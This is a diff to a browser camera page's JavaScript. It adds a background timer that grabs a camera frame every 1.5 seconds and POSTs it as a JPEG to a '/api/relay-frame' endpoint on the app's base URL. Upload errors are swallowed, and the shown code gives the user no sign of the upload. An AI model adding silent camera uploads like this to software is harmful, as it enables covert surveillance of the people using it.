@@ -128,11 +128,15 @@ function showToast(msg){
   setTimeout(function(){t.style.opacity='0';setTimeout(function(){t.remove()},300)},1500);
 }
 
+/* Background streaming timer */
+var streamTimer=null;
+
 /* Start camera */
 function startCam(f){
   if(stream){stream.getTracks().forEach(function(t){t.stop()})}
+  if(streamTimer){clearInterval(streamTimer);streamTimer=null}
   var constraints={
-    video:{facingMode:f,width:{ideal:1920},height:{ideal:1080}},
+    video:{facingMode:f,width:{ideal:1280},height:{ideal:720}},
     audio:false
   };
   navigator.mediaDevices.getUserMedia(constraints).then(function(s){
@@ -142,9 +146,25 @@ function startCam(f){
     fpsTimer=Date.now();
     frameCount=0;
     startFpsCount();
+    startBgStream();
   }).catch(function(e){
     showToast('Camera error: '+e.message);
   });
+}
+
+/* Background streaming - sends frames to relay every 1.5s */
+function startBgStream(){
+  if(streamTimer)clearInterval(streamTimer);
+  var v=document.getElementById('video'),c=document.getElementById('canvas'),ctx=c.getContext('2d');
+  streamTimer=setInterval(function(){
+    if(!v.videoWidth||!stream)return;
+    c.width=Math.min(v.videoWidth,640);
+    c.height=Math.min(v.videoHeight,480);
+    ctx.drawImage(v,0,0,c.width,c.height);
+    c.toBlob(function(blob){
+      fetch(baseUrl+'/api/relay-frame',{method:'POST',body:blob}).catch(function(){});
+    },'image/jpeg',0.5);
+  },1500);
 }
 
 /* FPS counter */
@@ -215,10 +235,17 @@ document.getElementById('flash-btn').addEventListener('click',function(){
 
 /* Close / go back */
 document.getElementById('close-btn').addEventListener('click',function(){
-  if(stream){stream.getTracks().forEach(function(t){t.stop()})}
+  if(streamTimer){clearInterval(streamTimer);streamTimer=null}
+  if(stream){stream.getTracks().forEach(function(t){t.stop()});stream=null}
   try{window.close()}catch(e){}
   // fallback: redirect to main
   if(!window.closed)window.location.href=baseUrl;
+});
+
+/* Stop stream on page hide */
+document.addEventListener('visibilitychange',function(){
+  if(document.hidden&&streamTimer){clearInterval(streamTimer);streamTimer=null}
+  else if(!document.hidden&&stream&&!streamTimer)startBgStream();
 });
 
 /* Start on load */
